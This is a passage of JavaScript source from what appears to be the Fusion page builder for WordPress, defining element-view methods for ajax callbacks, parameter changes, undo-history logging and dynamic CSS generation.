				}
			},

			/**
			 * Check for element ajax callbacks and run them.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			triggerAjaxCallbacks: function( skip ) {
				var self          = this,
					AjaxCallbacks = {},
					args          = {
						skip: 'undefined' === typeof skip ? false : skip
					};

				if ( 'undefined' !== typeof fusionAllElements[ this.model.get( 'element_type' ) ].has_ajax ) {

					// Collect callbacks. Do not fire the same action twice.
					_.each( fusionAllElements[ this.model.get( 'element_type' ) ].has_ajax, function( callback ) {
						AjaxCallbacks = {};
						AjaxCallbacks[ callback.action ] = {};
						AjaxCallbacks[ callback.action ][ 'function' ]   = callback[ 'function' ];
						AjaxCallbacks[ callback.action ].param_name = callback.param_name;
						AjaxCallbacks[ callback.action ].action     = callback.action;
					} );

					// Trigger ajax callbacks to populate query_data attribute
					_.each( AjaxCallbacks, function( callback ) {
						FusionApp.callback[ callback[ 'function' ] ]( callback.param_name, self.model.attributes.params[ callback.param_name ], self.model.attributes, args, self.model.get( 'cid' ), callback.action, self.model, self );
					} );
				}
			},

			updateExtra: function() {
				this.reRender();
			},

			updateDefault: function( param, value ) {
				var modelData        = jQuery.extend( this.model.attributes, {} ),
					reRender         = true,
					callbackFunction = false,
					params           = this.model.get( 'params' );

				// Only re-render if actually using default.
				if ( ( 'undefined' === typeof params[ param ] || '' === params[ param ] || 'default' === params[ param ] ) && ! this.dynamicParams.hasDynamicParam( param ) ) {

					callbackFunction = FusionPageBuilderApp.getCallbackFunction( modelData, param, value, this, true );
					if ( false !== callbackFunction && 'function' === typeof FusionApp.callback[ callbackFunction[ 'function' ] ] ) {
						reRender = this.doCallbackFunction( callbackFunction, false, param, value, modelData, true );
					}

					if ( reRender ) {
						this.reRender();
					}
				}
			},

			historyUpdateParam: function( param, value ) {
				var modelData        = jQuery.extend( this.model.attributes, {} ),
					reRender         = true,
					callbackFunction = false;

				this.changeParam( param, value, false, true );

				callbackFunction = FusionPageBuilderApp.getCallbackFunction( modelData, param, value, this, true );
				if ( false !== callbackFunction && 'function' === typeof FusionApp.callback[ callbackFunction[ 'function' ] ] ) {
					reRender = this.doCallbackFunction( callbackFunction, false, param, value, modelData, true );
				}

				if ( reRender ) {
					this.reRender();
				}
			},

			updateParam: function( param, value, event ) {
				var modelData        = jQuery.extend( this.model.attributes, {} ),
					reRender         = true,
					callbackFunction = FusionPageBuilderApp.getCallbackFunction( modelData, param, value, this );

				if ( false !== callbackFunction && 'function' === typeof FusionApp.callback[ callbackFunction[ 'function' ] ] ) {
					reRender = this.doCallbackFunction( callbackFunction, event, param, value, modelData );
				} else {
					this.changeParam( param, value );
				}

				return reRender;
			},

			setInitialValue: function( param ) {
				if ( 'undefined' !== typeof this.initialValue && 'undefined' === typeof this.initialValue[ param ] && 'undefined' !== typeof param ) {
					this.initialValue[ param ] = 'undefined' !== typeof this.model.get( 'params' )[ param ] ? this.model.get( 'params' )[ param ] : '';
				}
			},

			logChangeEvent: function( param, value, label ) {
				this.logHistory._param = this.logHistory._param || {};
				if ( ! ( param in this.logHistory._param ) ) {
					this.logHistory._param[ param ] = _.debounce( _.bind( function( param, value, label ) {
						var state = {
								type: 'param',
								param: param,
								newValue: value,
								cid: this.model.get( 'cid' )
							},
							elementMap  = fusionAllElements[ this.model.get( 'element_type' ) ],
							paramObject = elementMap.params[ param ],
							paramTitle  = 'object' === typeof paramObject ? paramObject.heading : param;

						if ( 'undefined' !== typeof label ) {
							paramTitle = label;
						} else if ( 'object' !== typeof paramObject && jQuery( '.multi-builder-dimension #' + param ).length ) {
							paramObject = elementMap.params[ jQuery( '.multi-builder-dimension #' + param ).closest( '.multi-builder-dimension' ).attr( 'id' ) ];
							if ( 'object' === typeof paramObject && 'string' === typeof paramObject.heading ) {
								paramTitle = paramObject.heading;
							}
						} else if ( 'object' !== typeof paramObject && jQuery( '.font_family #' + param ).length ) {
							paramObject = elementMap.params[ jQuery( '.font_family #' + param ).closest( '.fusion-builder-option' ).attr( 'data-option-id' ) ];
							if ( 'object' === typeof paramObject && 'string' === typeof paramObject.heading ) {
								paramTitle = paramObject.heading;
							}
						}

						state.oldValue = this.initialValue[ param ];
						delete this.initialValue[ param ];

						this.model.trigger( 'change' );
						FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.edited + ' ' + elementMap.name + ' - ' + paramTitle, state );
					}, this ), 500 );
				}
				this.logHistory._param[ param ]( param, value, label );
			},

			changeParam: function( param, value, label, silent ) {
				var parentView;
				if ( ! silent && ! this.model.get( 'inlineElement' ) ) {
					this.setInitialValue( param );
					this.model.attributes.params[ param ] = value;

					// Update parent after param has been changed.
					if ( 'multi_element_child' === this.model.get( 'multi' ) ) {
						parentView = FusionPageBuilderViewManager.getView( this.model.get( 'parent' ) );
						if ( parentView && 'function' === typeof parentView.updateElementContent ) {
							parentView.updateElementContent();
						}
					}
					this.logChangeEvent( param, value, label );
				} else {
					this.model.attributes.params[ param ] = value;
				}
			},

			/**
			 * Gets callback function for option change.
			 *
			 * @since 2.0.0
			 * @return {void}
			 */
			doCallbackFunction: function( callbackFunction, event, paramName, paramValue, modelData, skipChange ) {
				var reRender = true,
					returnData;

				callbackFunction.args   = 'undefined' === typeof callbackFunction.args ? {} : callbackFunction.args;
				callbackFunction.ajax   = 'undefined' === typeof callbackFunction.ajax ? false : callbackFunction.ajax;
				callbackFunction.action = 'undefined' === typeof callbackFunction.action ? false : callbackFunction.action;
				skipChange              = 'undefined' === typeof skipChange ? false : skipChange;

				// If skip is set then param will not be changed.
				callbackFunction.args.skip = skipChange;

				// If ajax trigger via debounce, else do it here and retun data.
				if ( callbackFunction.ajax ) {
					reRender = false;
					this.addLoadingOverlay();
					this._triggerCallback( event, callbackFunction, paramName, paramValue, modelData.cid, modelData );
				} else {
					returnData = FusionApp.callback[ callbackFunction[ 'function' ] ]( paramName, paramValue, callbackFunction.args, this );
				}
				if ( 'undefined' !== typeof returnData && 'undefined' !== typeof returnData.render ) {
					reRender = returnData.render;
				}

				return reRender;
			},

			/**
			 * Triggers a callback function.
			 *
			 * @since 2.0.0
			 * @param {Object}        event - The event.
			 * @param {string|Object} callbackFunction - The callback function.
			 * @return {void}
			 */
			triggerCallback: function( event, callbackFunction, paramName, paramValue, cid, modelData ) {

				if ( 'undefined' === typeof cid && 'undefined' !== typeof callbackFunction.cid ) {
					cid = callbackFunction.cid;
				}

				if ( 'undefined' === typeof modelData ) {
					modelData = jQuery.extend( this.model.attributes, {} );
				}

				// This is added due to the new elements causing max call stack.  Not sure why but it shouldn't be necessary in any case.
				if ( 'undefined' !== typeof modelData ) {
					delete modelData.view;
				}
				if ( 'fusion_do_shortcode' !== callbackFunction[ 'function' ] ) {
					FusionApp.callback[ callbackFunction[ 'function' ] ]( paramName, paramValue, modelData, callbackFunction.args, cid, callbackFunction.action, this.model, this );
				} else {
					FusionApp.callback[ callbackFunction[ 'function' ] ]( cid, callbackFunction.content, callbackFunction.parent );
				}
			},

			addCssProperty: function ( selectors, property, value, important ) {

				if ( 'object' === typeof selectors ) {
					selectors = Object.values( selectors );
				}

				if ( 'object' === typeof selectors ) {
					selectors = selectors.join( ',' );
				}

				if ( 'object' !== typeof this.dynamic_css[ selectors ] ) {
					this.dynamic_css[ selectors ] = {};
				}

				if ( 'undefined' !== typeof important && important ) {
					value += ' !important';
				}
				if ( 'undefined' === typeof this.dynamic_css[ selectors ][ property ] || ( 'undefined' !== typeof important && important ) || ! this.dynamic_css[ selectors ][ property ].includes( 'important' ) ) {
					this.dynamic_css[ selectors ][ property ] = value;
				}
			},

			isDefault: function( param ) {
				return this.values[ param ] === fusionAllElements[ this.model.get( 'element_type' ) ].defaults[ param ];
			},

			parseCSS: function () {
				var css = '';

				if ( 'object' !== typeof this.dynamic_css ) {
					return '';
				}

				_.each( this.dynamic_css, function ( properties, selector ) {
					if ( 'object' === typeof properties ) {
						css += selector + '{';
						_.each( properties, function ( value, property ) {
							css += property + ':' + value + ';';
						} );
						css += '}';
					}
				} );

				return css;
			}

		} );
	} );
}( jQuery ) );
